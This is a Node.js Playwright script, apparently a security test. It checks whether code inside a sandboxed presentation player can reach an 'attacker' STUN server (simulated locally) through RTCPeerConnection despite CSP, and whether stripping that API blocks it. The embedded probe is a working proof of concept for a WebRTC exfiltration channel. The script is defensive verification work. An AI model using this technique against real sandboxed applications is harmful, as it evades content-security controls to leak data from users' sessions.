// V1.2 verify: RTCPeerConnection to attacker STUN sends UDP from inside player (full Chromium).
// Plus mitigation: strip RTCPeerConnection in bootstrap; bypass via fresh realm? (frames/workers blocked by CSP).
const fs=require('node:fs'),path=require('node:path');
const {chromium}=require('playwright'); const L=require('./lib-a1-copy.cjs');
const STUN_PORT=4663, STUN_IP='127.0.0.1';
const probe=(extra)=>`<!doctype html><html><body><h1>rtc</h1><script>
window.__v=[];window.addEventListener('securitypolicyviolation',e=>window.__v.push(e.effectiveDirective),true);
${extra}
async function go(){try{
 const pc=new RTCPeerConnection({iceServers:[{urls:'stun:${STUN_IP}:${STUN_PORT}'}]});
 pc.createDataChannel('x');
 const o=await pc.createOffer();await pc.setLocalDescription(o);
 window.__rtc='offer-set';
}catch(e){window.__rtc='ERR:'+e.name+':'+e.message}}
go();
</script></body></html>`;
const strip=`try{window.RTCPeerConnection=undefined;window.webkitRTCPeerConnection=undefined;Object.defineProperty(window,'RTCPeerConnection',{value:undefined,configurable:false});}catch(e){}`;
const cases={
 'rtc-baseline':probe(''),
 'rtc-stripped':probe(strip),
 'rtc-webrtc-csp-note':probe(''), // same; we also inspect runner CSP has no webrtc directive
};
(async()=>{
 const site=await L.startSite(4660); const udp=await L.startUdp(STUN_PORT);
 const out={};
 try{
  const browser=await chromium.launch({channel:'chromium'});
  for(const [name,html] of Object.entries(cases)){
   const page=await (await browser.newContext()).newPage();
   await L.openWorkspace(page,'http://127.0.0.1:4660/');
   await L.openFile(page,L.makePackage(html),'r.zip');
   await page.locator('[data-pres-start-button]').waitFor({state:'visible',timeout:15000});
   const before=udp.log.length;
   await page.locator('[data-pres-start-button]').click();
   await L.sleep(3000);
   const frame=L.appFrame(page); const s=await L.dialogState(page);
   out[name]={hostStatus:s.status,rtc:frame?await frame.evaluate(()=>window.__rtc).catch(()=>null):null,violations:frame?await frame.evaluate(()=>window.__v).catch(()=>null):null,stunDatagrams:udp.log.slice(before).length,sample:udp.log.slice(before,before+2)};
   console.log(`== ${name}: host=${s.status} rtc=${out[name].rtc} stun=${out[name].stunDatagrams} viol=${JSON.stringify(out[name].violations)}`);
   await page.close();
  }
  await browser.close();
 } finally { await site.close(); await udp.close(); fs.writeFileSync(path.join(__dirname,'logs','v-webrtc.json'),JSON.stringify(out,null,2)); }
})().catch(e=>{console.error(e);process.exit(1)});
